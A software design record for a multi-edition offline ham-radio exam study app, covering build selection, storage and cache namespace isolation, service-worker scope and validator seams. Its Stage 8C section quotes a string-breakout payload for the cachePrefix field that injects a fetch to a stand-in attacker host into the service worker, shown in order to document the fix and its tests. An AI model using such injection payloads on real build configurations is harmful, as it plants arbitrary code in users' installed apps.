# Edition-build design: build selection, isolation, and boundaries (Stage 8A2)

Recorded: October 11, 2026. Status: as-built Stage 8A2 experiment, committed
(and deployed) as `3a7dfab` with documentation/test follow-ups. The architecture
remains subject to the explicit adopt/revise/reject decision in the multi-edition plan. Companion to
[MULTI_EDITION_PLAN.md](MULTI_EDITION_PLAN.md) (decision and acceptance
criteria) and [INDIA_ASOC_REQUIREMENTS.md](INDIA_ASOC_REQUIREMENTS.md)
(evidence; the synthetic fixture here models nothing Indian). Requirements
and findings from PR #4's decision log are respected: no Indian content, no
claims about official ASOC behavior, "Part A/Part B" reserved for the future
India edition.

## Goals and non-goals

Prove that one repository can emit separate, self-contained, offline-capable
edition artifacts (US + a clearly fictional synthetic edition) sharing one
engine, with storage/cache/service-worker namespace isolation on one origin,
deterministic per-edition output, and fail-before-mutation guarantees.
Non-goals: no runtime country selector, no `if (india)` branches, no India
content, no Part A/B scoring engine, no NCVEC-selection pipeline, no
repository rename or deployment change, no budget/target change.

## Edition input contract

An edition is one directory of inputs:

- `editions/<key>/edition.json` — the existing validated profile schema
  (`schemaVersion: 1`), unchanged. `editionKey` must equal `<key>`.
- `editions/<key>/pools.json` — the pool registry the profile's
  `build.poolRegistry` points at.
- `editions/<key>/banks/*.json` — banks per `build.questionBanks`.
- Optional: figure manifest, guide image — same optional-input rules as
  today (figureless editions are already supported end to end).

The **US edition keeps its existing layout** (`data/edition.json`,
`data/pools.json`, `data/*.json`, `assets/…`) and remains the default when no
selection is given: the existing command, tests, CI, and validators are
untouched. `<key>` matches the same lowercase-hyphen shape as `editionKey`.

## Build selection

`npm run build` (unchanged) builds the US edition to `dist/`.
`npm run build -- --edition <key>` builds `editions/<key>/` to
`dist-editions/<key>/` (standalone `index.html` plus `pwa/`). Selection
resolves before any output mutation: an unknown key, a directory without a
readable `edition.json`, or a profile whose `editionKey` disagrees with the
selected key fails the build with no `dist/` or `dist-editions/` write.
Because non-US output lives outside `dist/`, one edition's build can never
overwrite another's artifacts; each build still rmSync's only its own PWA
output directory. Repeated builds of the same edition are byte-identical
(same inputs, same code, no timestamps).

## Shared vs. edition-specific files

- **Shared engine (identical bytes in every edition):** `src/app.js`,
  `src/storage.js`, `src/study-scope.js`, `src/exam-engine.js`,
  `src/style.css`, `src/pwa/sw.js`, `src/pwa/register.js`,
  `src/pwa/head.html`, `src/pwa/install.html`, icons.
- **Edition-specific (selected-content-only embedding):** profile, pool
  registry, question banks, optional figures/guide image, and the resolved
  branding values below.
- **Branding slots in the shared template `src/index.html`:** the document
  `<title>`, the `<h1>` app name and tagline, and the static About app name
  become `__EDITION_TITLE__` / `__EDITION_APP_NAME__` /
  `__EDITION_TAGLINE__` / `__EDITION_ABOUT_NAME__` placeholders resolved at
  build time from the validated profile (`displayName`, `subtitle`). The US
  profile resolves them to today's exact literals, so these four slots
  render identical text to before -- the overall US artifact is
  deterministic and behaviorally compatible with the pre-Stage-8A2
  baseline, not byte-identical to it (see "Rollback and risks" for the
  measured size delta and its cause). The PWA `manifest.webmanifest` likewise gains
  `__EDITION_MANIFEST_*__` slots (name, short name, description from a new
  optional `manifestDescription` profile field, defaulting to `subtitle`).
- **Long-form content slots (review-fix, closed during the experiment):**
  the Help & About and Getting Started panels' inner prose -- previously
  hardcoded, FCC/NCVEC-specific markup in `src/index.html` -- are now the
  `__HELP_CONTENT__`/`__GETTING_STARTED_CONTENT__` placeholders, each
  sourced from an edition-overridable HTML-fragment build input
  (`profile.build.helpContent`/`gettingStartedContent`, optional, `.html`).
  Absent -- the US case -- falls back to `src/help-content.html` /
  `src/getting-started-content.html`, today's exact extracted content, read
  verbatim. The synthetic fixture declares its own two short, fictional
  fragments (`editions/synthetic/{help-content,getting-started-content}.html`).
  The Mock Exam Setup metadata row that used to hardcode the literal term
  "FCC element" now reads a new, required `labels.elementTermLabel` profile
  field instead (US declares `"FCC element"`, unchanged); the one-sentence
  Mock Exam Setup disclaimer and the pre-JS-load footer fallback were
  reworded to be regulator-neutral (a disclosed, non-byte-identical but
  equivalent-meaning copy change, not a templated slot, since neither names
  a project-specific term worth a whole seam).

### Known boundary (reduced to inert fallback literals)

Everything above closes the "ships US copy verbatim" gap for the content
that is actually rendered. What remains, confirmed by inspecting the built
synthetic artifact byte-for-byte: three INERT fallback literals in shared
`src/app.js` (`"FCC reference: "`, `"NCVEC source"`, `"FCC element"`, each
written as `EDITION_CONFIG.<field> || "<US literal>"`) that are never
reached once a profile supplies its own value -- present as dead bytes, not
as rendered text -- plus one internal DOM id, `startTechnician`, reused
by the synthetic Getting Started override's own "Start with Alpha" button
(a naming leftover, not user-visible copy; renaming it would mean editing
the shared `src/app.js` wiring itself). Neither is fixed here.

## Storage and cache namespace rules

`namespacePolicy` stops being validated-only (its Stage 7 state) and becomes
the single source for runtime namespaces, consumed via the already-embedded
`window.HAM_EXAM_EDITION_CONFIG` projection:

- `storageKey` → canonical state key (`src/storage.js`).
- `legacyKeys` → the four legacy-key templates; the two entries containing
  `{poolKey}` are per-pool index/bookmarks prefixes, the other two the
  pool/theme keys.
- `cachePrefix` → service-worker cache name (`<prefix><version-hash>`) and
  the activation cleanup filter (`startsWith(prefix)`), so one edition's
  activation can never delete another edition's caches.
- `probeKey` (new optional field) → the storage availability probe key. The
  US profile does not declare one -- `src/storage.js` falls back to its
  existing literal when the field is absent, which is exactly the normal,
  tested fallback path, so US behavior is unchanged without adding a
  redundant explicit value. The synthetic fixture declares its own
  `probeKey` instead, exercising the explicit-value path.

Every edition must declare distinct values; the profile validator rejects
duplicates within a policy and the runtime falls back to the current US
literals only when the projection field is absent, preserving every existing
US behavior and migration test.

## Service-worker scope rules

Both editions' workers register with relative scope under their own path
(`dist/` vs. `dist-editions/<key>/`), giving each worker a distinct scope on
one origin. The worker script itself is shared bytes parameterized only by
cache prefix and content-hash version. Same-origin coexistence and
activation-cleanup isolation are acceptance criteria tested in Phase 4.

## Validation and fail-before-mutation

- Profile/registry/bank/figure gates keep their existing order and all run
  before the first output mutation, per edition.
- Two explicit policy seams, both defaulting to today's exact US behavior so
  every existing validator test passes unmodified:
  - `validateEditionProfile(profile, { poolKeys })` — pool-key identity
    cross-checks (profile `poolKeys`, `build.questionBanks` keys) run against
    the *selected edition's* key set instead of the hardcoded US set. The US
    build passes the same hardcoded set as today; a non-US build passes its
    profile's own `build.questionBanks` keys.
  - `assertPoolRegistry(registry, banks, { idPolicy })` — `"us"` (default)
    keeps the T/G-E prefix and NCVEC ID-shape checks; `"generic"` keeps all
    structural validation (schema, counts, blueprint sums, scoring fields,
  uniqueness, sub consistency) and drops only the US identity shapes,
    requiring instead: pool keys match the profile set, question IDs are
    unique non-empty strings that start with their pool's
    `questionIdPrefix`, and group keys are non-empty ID prefixes.
- The runtime-projection allowlist gains two Stage 8A2 fields:
  `namespacePolicy` and `elementTermLabel`. Nothing else is projected; build-only data never embeds.
- Non-US editions use the `"generic"` registry policy; the US build never
  does. Unsupported boundaries (per-part scoring, selection pipelines,
  per-edition validators beyond these two seams) fail clearly at build or
  are documented below rather than silently widened.

## Compatibility and determinism tests

- Existing unit suites (`edition-profile`, `pool-registry`, `storage`,
  `build-gate`) pass unmodified where behavior is unchanged; new cases cover
  the two policy seams, `probeKey`, and namespaced storage.
- New build-gate cases: synthetic build succeeds with only synthetic
  content embedded; unknown `--edition` fails before any output mutation
  (seeded `dist/` and `dist-editions/` byte-identical -- unchanged by a
  failed build, the ordinary fail-before-mutation guarantee); repeated
  builds of either edition are byte-identical to each other (determinism);
  the US build is deterministic and behaviorally compatible with the
  pre-Stage-8A2 committed artifact, not byte-identical to it (measured size
  delta in "Rollback and risks"); branding/manifest slots resolve to the
  edition's values; cache prefix appears in the emitted worker and not the
  other edition's.
- Browser layer (only for DOM/PWA/SW/storage/offline): both editions served
  under separate paths on one origin — loading either does not read or
  overwrite the other's saved state, activation cleanup leaves the other
  edition's caches intact, each worker controls only its own path, both load
  offline, and no external runtime requests occur.

## Rollback and risks

Rollback: the seam is additive; reverting removes `editions/`,
`dist-editions/`, and the seam commits with no US data moved and no US
output path changed. The US build is **deterministic and behaviorally
compatible** with the pre-Stage-8A2 baseline (commit `31f0245`), not
byte-identical to it: standalone `dist/index.html` measured 951,280 B at
that baseline and measures 957,377 B now (+6,097 B; PWA
`dist/pwa/index.html` similarly went 953,726→959,823 B, the same +6,097 B),
against the unchanged 1,048,576-byte budget -- 91,199 B free, comfortably
clear of the 16 KiB preferred margin. The growth is the
projected `namespacePolicy`/`elementTermLabel` runtime-config fields, the
`src/storage.js` namespace/identity-resolution code (`resolveNamespace()`/
`resolveEditionIdentity()`), and the content-slot plumbing (the two content
files are read from disk rather than the template, not inlined twice).
Risks: (1) shared Help/footer prose in non-US output — closed, see
"Boundaries found" below (the two residual fallback literals and one
internal DOM id are disclosed there, not accepted-and-ignored); (2)
validator policy seams could be abused to weaken US gates — mitigated by
the default-policy design and unchanged US tests; (3) same-origin PWA scope
overlap — mitigated by separate output roots and Phase 4 browser evidence.
Architecture decision (adopt/revise/reject) is reserved for review after
this experiment, per MULTI_EDITION_PLAN.md.

## Boundaries found during the experiment

Implementing this seam surfaced four concrete, reproduced US-specific
assumptions beyond the two policy seams above. A first review of this
experiment correctly rejected two of them (synthetic persistence not
actually working; US-specific Help/footer copy reaching the synthetic
artifact) as acceptance-blocking rather than disclosable boundaries; both
are now fixed, below. The remaining two are genuinely out of scope for this
build-selection-seam slice and are still documented, not silently widened:

1. **Fixed: `src/storage.js`'s `POOL_KEYS`/`DEFAULT_POOL_KEY`/
   `EXAM_TIMER_SECONDS_VALUES` were hardcoded to the US pools/timer set.**
   `createStorageAdapter()`'s `assertRegistryAndBanks()` required
   `registry.pools[key]` to exist for every hardcoded `POOL_KEYS` entry, so
   the synthetic edition's adapter threw at construction and ran
   memory-only. Closed by extending the SAME embedded-config-with-fallback
   pattern `resolveNamespace()` already established, to these three fields
   (`resolveEditionIdentity()`, reading `HAM_EXAM_EDITION_CONFIG.poolKeys`/
   `.defaultPoolKey`/`.examTimerSecondsValues`, already projected since
   Stage 7D) -- absent config/field still falls back to the exact US
   literals (unchanged US behavior, re-verified), a present-but-
   malformed value still throws (fail closed, same policy as the
   namespace). The synthetic edition now genuinely saves and reloads study
   progress for its own `alpha`/`beta` pools (`tests/editions-isolation.spec.js`).
2. **Fixed: US-specific copy reached the synthetic artifact** via three
   locations beyond the branding slots: the long-form Help & About /
   Getting Started prose, the Mock Exam Setup disclaimer sentence, and the
   pre-JS-load footer fallback text. Closed via the new content-slot
   mechanism and copy generalization described above in "Shared vs.
   edition-specific files." Confirmed by inspecting the built synthetic
   artifact for every US-specific term (`FCC`, `NCVEC`, `ARRL`,
   `Technician`/`General`/`Extra`, `US Ham Exam`, the repository URL): at
   the time, nothing remained in the generated HTML documents except three
   inert, unreachable JS fallback literals and one internal
   (non-user-visible) DOM id, both described in the "Known boundary" note
   above. A later independent audit found one more real leak this pass
   missed -- `src/pwa/head.html`'s PWA metadata, outside the two generated
   HTML documents' own templating -- closed in Stage 8C below.
3. **Not fixed: `scripts/figure-references.js`'s figure-prefix policy is
   hardcoded to exactly one uppercase letter** (`FIGURE_PREFIX_RE =
   /^[A-Z]$/`), checked unconditionally for every pool regardless of
   whether that pool's bank actually references any figure. An edition
   whose `questionIdPrefix` is not a single letter cannot build AT ALL,
   even figureless, until this is parameterized or the gate is skipped for
   a pool with zero figure references/fields. The synthetic fixture avoids
   this boundary by using single-letter prefixes (`A`/`B`, still non-T/G/E)
   rather than exercising it -- a real gap in this gate's generality, not
   attempted here.
4. **Not fixed: `scripts/pool-registry.js`'s "generic" `idPolicy` and the
   build-selection seam itself remain the only two parameterized policy
   seams.** Per-part (Part A/Part B) scoring, an NCVEC-style selection
   pipeline, and every other validator not named above stay US-only and
   fail clearly (or simply do not apply) for a non-US edition -- unchanged
   from the original design, still correctly out of scope for this
   experiment.

## Stage 8C: PWA metadata isolation and cache-prefix validation

Two bounded fixes closing gaps a later independent audit found in the
Stage 8A2 work above. Both are scoped exactly to their own finding --
neither widens into India content, a storage-schema change, a repository
rename, a deployment change, or the adopt/revise/reject decision itself.

### 1. PWA metadata isolation (`src/pwa/head.html`)

`apple-mobile-web-app-title` and the `<meta name="description">` tag --
read by the OS for "Add to Home Screen"/app-switcher naming, outside the
generated documents' own `<title>`/`<h1>`/About-name templating the
Stage 8A2 branding slots already covered -- were still the hardcoded
literals `"US Ham Exam"` and `"Offline study app for the FCC Technician,
General, and Extra amateur-radio exams"`, shipped verbatim in every
edition's PWA build, including the synthetic one.

Fixed with two new placeholders, `__EDITION_HEAD_TITLE__` /
`__EDITION_HEAD_DESCRIPTION__`, resolved in `scripts/build.js` -- **no new
profile field**: they reuse the SAME already-resolved `displayName` /
`manifestDescription` values the PWA manifest and the `<h1>`/About-name
slots already use, so an edition's PWA head and its manifest describe the
app identically by construction, and the US profile's existing declared
`manifestDescription` keeps `head.html`'s meta description byte-identical
to before this field existed (confirmed: `dist/pwa/index.html` is
byte-for-byte unchanged). Ordering care was required: these placeholders
live INSIDE `head.html`'s own text, which itself is spliced into the shared
`src/index.html` template via the pre-existing `__PWA_HEAD__` placeholder --
`scripts/build.js#render()`'s single-occurrence `String.replace()` means
`__PWA_HEAD__` must be keyed before `__EDITION_HEAD_TITLE__`/
`__EDITION_HEAD_DESCRIPTION__` in the replacements object, or the inner
placeholders would still read as literal text when the "no unresolved
placeholders" check runs. Distinct placeholder names from
`__EDITION_APP_NAME__` (already used once, in the document `<h1>`) for the
same reason: the single-occurrence `replace()` would otherwise leave this
file's own copy of the text unresolved.

### 2. Service-worker cache-prefix validation (`namespacePolicy.cachePrefix`)

`cachePrefix` is substituted into `src/pwa/sw.js` as JS SOURCE TEXT at build
time (a service worker has no access to `window.HAM_EXAM_EDITION_CONFIG`,
so the literal must be baked in) -- the one namespace field that bypasses
`asInlineScript()`'s JSON-safe embedding every other projected value goes
through. Before this fix, `scripts/edition-profile.js` only required
`cachePrefix` to be a non-blank string, with no charset restriction --
confirmed exploitable: a profile declaring
`cachePrefix: 'x"; fetch("https://evil.example"); //'` built successfully
and produced a shipped service worker containing
`const CACHE_PREFIX = "x"; fetch("https://evil.example"); //";` --
arbitrary JavaScript running in every installed PWA's service worker.

Fixed with two layers: (1) `CACHE_PREFIX_RE`
(`/^[a-z][a-z0-9]*(-[a-z0-9]+)*-$/` -- lowercase/hyphen, same discipline as
`EDITION_KEY_RE`, with a REQUIRED trailing hyphen since the full cache name
is `<cachePrefix><12-hex-char version hash>` with no separator) added to
`validateNamespacePolicy()`, the one function both the profile gate and the
runtime-projection gate already call -- rejects every string-literal-breaking
shape (quotes, backslashes, newlines, spaces, underscores, leading digits,
leading/double hyphens, a missing trailing hyphen) before any `dist/`
mutation, at the SAME point the rest of the profile is validated
(`assertEditionProfile()`, near the top of `main()`). (2) `scripts/build.js`
re-derives `cachePrefix` immediately after that gate (still before the
first `fs` mutation) and re-checks `CACHE_PREFIX_RE` directly, named at the
one use site that actually needs the guarantee -- defense in depth against
the earlier gate ever silently regressing. The substitution itself now also
runs `cachePrefix` through `jsonStringContent()` (the same escaped-JSON-
string-content helper the manifest slots use) instead of a bare value, so
even a future relaxation of `CACHE_PREFIX_RE` could not reopen the
injection this pattern closes.

Both of today's real values (`"ham-exam-"`, `"synthetic-exam-"`) already
match `CACHE_PREFIX_RE`; cache naming and activation-cleanup behavior for a
valid prefix are unchanged (confirmed: `CACHE_NAME = CACHE_PREFIX +
"<hash>"`, `key.startsWith(CACHE_PREFIX) && key !== CACHE_NAME`, and a
custom valid prefix produces a syntactically-parseable worker with the
expected literal).

### Testing

- `tests/unit/edition-profile.test.js`: cachePrefix rejects twelve malformed
  shapes (quote/backslash/newline breakouts, space/underscore delimiters,
  uppercase, missing/leading/doubled hyphen, leading digit, a
  template-literal-shaped string) at both the profile level and the derived
  runtime-projection level (the shared `validateNamespacePolicy()`); accepts
  single- and multi-segment valid prefixes.
- `tests/unit/build-gate.test.js`: a malformed cachePrefix (six of the
  above attacks, driven through the real `--edition` CLI) fails the build
  before any `dist/`/`dist-editions/` mutation, leaving an unrelated
  pre-existing US `dist/` byte-for-byte untouched; a malformed US
  `cachePrefix` fails the same way; a valid custom cachePrefix produces the
  expected `CACHE_NAME`/activation-cleanup text and a worker that parses as
  syntactically valid JavaScript; the PWA head metadata resolves to each
  edition's own `displayName`/`manifestDescription` with no US branding
  anywhere in the synthetic `<head>` (scoped to the `<head>`, not the whole
  document, since shared engine code legitimately carries the inert
  fallback literals from finding 2 above); the US PWA head is unchanged.
- `tests/editions-isolation.spec.js`: the one addition needing a real
  browser -- both editions' SERVED `<head>` (what an OS reading "Add to
  Home Screen" metadata actually sees) carry their own
  `apple-mobile-web-app-title`/description, with no US term anywhere in the
  synthetic edition's rendered `<head>`.

### Remaining limitation (unchanged, still out of scope)

`scripts/figure-references.js`'s figure-prefix policy is still hardcoded to
exactly one uppercase letter (finding 3 above) -- neither Stage 8C fix
touches it; it remains the one concrete, reproduced gap in validator
generality this experiment has not closed.
